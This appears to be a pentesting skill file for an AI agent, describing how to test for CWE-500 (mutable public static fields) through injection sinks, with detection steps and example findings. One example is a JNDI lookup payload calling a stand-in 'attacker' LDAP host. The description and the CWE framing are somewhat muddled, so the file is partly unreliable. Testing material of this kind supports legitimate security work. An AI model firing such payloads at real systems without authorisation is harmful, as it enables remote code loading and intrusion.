
name: cwe-500-public-static-field-not-marked-final
description: Use when a web injection sink accepts CWE input.
version: 1.0.0
license: MIT
platforms: [linux, windows]
tags: [cwe, cwe-500, owasp, top10-2025, pentest]
category: pentesting-skills
related_skills:
  - owasp-a05-injection
---

# CWE-500 - Public Static Field Not Marked Final

CWE-500: a public static field is not marked final, so an attacker can mutate class state through the injection sink (an injection-driven reflection call that writes a static instead of only reading input).

## Parent Skill

This is a sub-skill of `owasp-a05-injection` (A05 Injection, OWASP Top 10 2025). Load the parent for overall category scope, the shared test procedure, and validation criteria (negative control). This skill covers the CWE-500 detail: what to look for, how to trigger it, and what a confirmed finding looks like.

## When to Use

- Any parameter reaching a reflection call or static field in the stack, with the sink reached via an injection path (A05).

## Detection & Test

1. Trigger the injection and target members whose access is public and not final; watch for a static field being overwritten in a logged value or error echo.
2. Probe with a reflection-aware payload (JNDI/EL/OGNL reference) and observe whether the value lands in shared static state rather than a local instance.
3. Replay the injection with a payload that assigns (writes through) rather than evaluates, then read the mutated static back on a second request.

## Example Findings

- `GET /product?id=${jndi:ldap://attacker/x}` where the lookup lands in a static holder and is later reflected back.
- A class static used as a global flag that flips after injection and reflects in subsequent responses.

## Impact

- Control over shared application state, enabling deserialization-to-RCE adjacent paths or a persistent per-instance behavior change.
- Cross-request contamination when one attacker's input mutates a value later seen by others.

## See Also

- `owasp-a05-injection` - parent skill (A05 scope, test procedure, validation, reporting).
- `owasp-top10-2025-testing` - top-level OWASP Top 10 2025 reference (full CWE table, priority order).